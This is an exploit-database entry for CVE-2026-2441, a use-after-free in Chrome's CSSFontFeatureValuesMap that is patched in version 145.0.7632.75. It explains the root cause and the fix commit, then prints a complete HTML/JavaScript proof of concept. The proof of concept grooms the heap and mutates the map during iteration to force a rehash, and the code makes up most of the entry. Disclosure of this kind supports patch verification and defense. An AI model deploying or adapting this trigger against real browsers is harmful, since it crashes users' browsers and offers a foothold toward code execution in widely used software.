---
title: Google Chrome <  145.0.7632.75 - CSSFontFeatureValuesMap Use-After-Free
url: https://cxsecurity.com/issue/WLB-2026020022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-23
fetch_date: 2026-02-24T04:11:33.704970
---

# Google Chrome <  145.0.7632.75 - CSSFontFeatureValuesMap Use-After-Free

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Google Chrome < 145.0.7632.75 - CSSFontFeatureValuesMap Use-After-Free** **2026.02.23**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-2441](https://cxsecurity.com/cveshow/CVE-2026-2441/ "Click to see CVE-2026-2441")**  CWE: **N/A** | |

# Exploit Title: Google Chrome < 145.0.7632.75 - CSSFontFeatureValuesMap Use-After-Free
# Date: 2026-02-23
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://www.google.com/chrome/
# Software Link: https://www.google.com/chrome/
# Version: Chrome <= 144.x | Chrome < 145.0.7632.75
# Tested on: Windows 11 / Linux / macOS
# CVE: CVE-2026-2441
# Exploit Repository: https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2026/CVE-2026-2441
## Description
A use-after-free vulnerability exists in Google Chrome's CSS engine (Blink) within the CSSFontFeatureValuesMap implementation. When an iterator is created over a CSSFontFeatureValuesMap object and the underlying HashMap is mutated during iteration, a rehash operation occurs, freeing the original memory while the iterator still holds a raw pointer to it. This leads to a use-after-free condition that can be exploited to execute arbitrary code inside the Chrome sandbox.
The vulnerability was actively exploited in the wild as a zero-day before the patch was released.
## Vulnerable Versions
- Google Chrome <= 144.x
- Google Chrome < 145.0.7632.75
- Microsoft Edge (prior to Chromium 145 update)
- Opera (prior to 127.0.5778.64)
- Any Chromium-based browser using affected Blink versions
## Technical Details
\*\*Root Cause:\*\* In `third\_party/blink/renderer/core/css/css\_font\_feature\_values\_map.cc`, the `FontFeatureValuesMapIterationSource` holds a raw pointer (`const FontFeatureAliases\* aliases\_`) to the internal HashMap. When the map is mutated via `set()` or `delete()` during iteration, the HashMap rehashes, the old storage is freed, and the pointer becomes dangling.
\*\*Fix:\*\* Commit `63f3cb4864c64c677cd60c76c8cb49d37d08319c` replaces the raw pointer with a deep copy (`const FontFeatureAliases aliases\_`).
## CVSS Score
\*\*8.8 (High)\*\* - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
## Proof of Concept
```html
<!DOCTYPE html>
<!--
CVE-2026-2441 - CSSFontFeatureValuesMap UAF
Author: nu11secur1ty
Date: 2026-02-23
Repository:
-->
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="author" content="nu11secur1ty">
<title>CVE-2026-2441 PoC - nu11secur1ty</title>
<style id="target-style">
@font-feature-values Target {
@styleset {
a:1; b:2; c:3; d:4; e:5; f:6; g:7; h:8;
i:9; j:10; k:11; l:12; m:13; n:14; o:15;
}
}
</style>
<style id="groom-style"></style>
</head>
<body>
<h2>CVE-2026-2441 Proof of Concept</h2>
<p>Author: nu11secur1ty</p>
<p>Check browser console for output. If browser crashes -> VULNERABLE</p>
<script>
// =================================================================
// CVE-2026-2441 Use-After-Free Exploit
// Author: nu11secur1ty
// =================================================================
console.log("==========================================");
console.log("CVE-2026-2441 PoC - nu11secur1ty");
console.log("==========================================");
// Heap grooming - create stable heap state
function groomHeap(count) {
let style = document.getElementById('groom-style');
if (!style || !style.sheet) return [];
// Clear existing
while (style.sheet.cssRules.length) {
try { style.sheet.deleteRule(0); } catch(e) {}
}
// Create groom objects
for (let i = 0; i < count; i++) {
try {
style.sheet.insertRule(
`@font-feature-values Groom${i} { @styleset { v${i}: ${i}; } }`,
style.sheet.cssRules.length
);
} catch(e) {}
}
console.log("[+] Heap groomed with " + count + " objects");
return Array(count);
}
// Main exploit logic
try {
// Phase 1: Prepare heap
groomHeap(64);
// Phase 2: Get target map
let sheet = document.getElementById('target-style').sheet;
if (!sheet || !sheet.cssRules.length) {
throw new Error("Target CSS rule not found");
}
let rule = sheet.cssRules[0];
let map = rule.styleset;
console.log("[+] CSSFontFeatureValuesMap size: " + map.size);
// Phase 3: Create iterator - RAW POINTER CAPTURED HERE
console.log("[\*] Creating iterator (raw pointer captured)");
let iterator = map.entries();
let step = 0;
let iterations = 0;
// Phase 4: Trigger UAF through mutation + rehash
console.log("[\*] Triggering rehash + UAF...");
while (step < 10) {
let result = iterator.next();
if (result.done) break;
let [key, value] = result.value;
iterations++;
console.log(" [step " + step + "] Read: " + key + " = " + value);
// MUTATION: delete current key
map.delete(key);
// MUTATION: massive insert to force rehash
for (let i = 0; i < 512; i++) {
map.set("spray\_" + step + "\_" + i, [i, i+1, i+2]);
}
step++;
}
console.log("[\*] Completed " + iterations + " iterations");
// Phase 5: Final check
console.log("[\*] Exploit execution complete");
console.log("[\*] If browser crashed: VULNERABLE");
console.log("[\*] If page survived: PATCHED");
console.log("==========================================");
console.log("CVE-2026-2441 - nu11secur1ty");
console.log("Repository: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-2441");
console.log("==========================================");
} catch (e) {
console.log("[!] EXCEPTION: " + e.message);
console.log("[!] This indicates UAF was triggered");
console.log("[!] CVE-2026-2441 - nu11secur1ty");
}
// Force layout recalc as additional trigger
void document.body.offsetWidth;
</script>
<!-- Alternative for...of trigger -->
<script>
try {
let altStyle = document.createElement('style');
document.head.appendChild(altStyle);
altStyle.sheet.insertRule(
'@font-feature-values Alt{@styleset{x:1; y:2; z:3;}}', 0
);
let altMap = altStyle.sheet.cssRules[0].styleset;
for (let [k, v] of altMap) {
altMap.delete(k);
for (let i = 0; i < 256; i++) {
altMap.set("alt\_" + i, [i]);
}
break;
}
} catch(e) {
console.log("[!] Alternative trigger exception: " + e.message);
}
</script>
</body>
</html>
# Demo:
[href](https://www.patreon.com/posts/cve-2026-2...